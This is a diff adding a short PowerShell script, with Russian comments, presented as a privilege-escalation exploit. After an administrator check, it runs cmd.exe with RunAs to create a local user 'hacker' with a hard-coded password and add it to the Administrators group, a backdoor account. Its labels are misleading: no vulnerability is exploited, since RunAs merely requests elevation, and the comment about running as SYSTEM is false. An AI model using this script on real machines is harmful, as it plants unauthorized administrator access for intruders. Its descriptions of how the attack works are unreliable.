@@ -1,0 +1,15 @@
+# Проверка на административные привилегии
+function Test-Admin {
+    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+if (Test-Admin) {
+    Write-Host "[+] Already running with administrative privileges!"
+} else {
+    Write-Host "[!] Not running with administrative privileges."
+    Write-Host "[+] Trying to exploit vulnerability..."
+    # Пример: Запуск команды от имени SYSTEM
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c net user hacker P@ssw0rd /add" -Verb RunAs
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c net localgroup administrators hacker /add" -Verb RunAs
+}
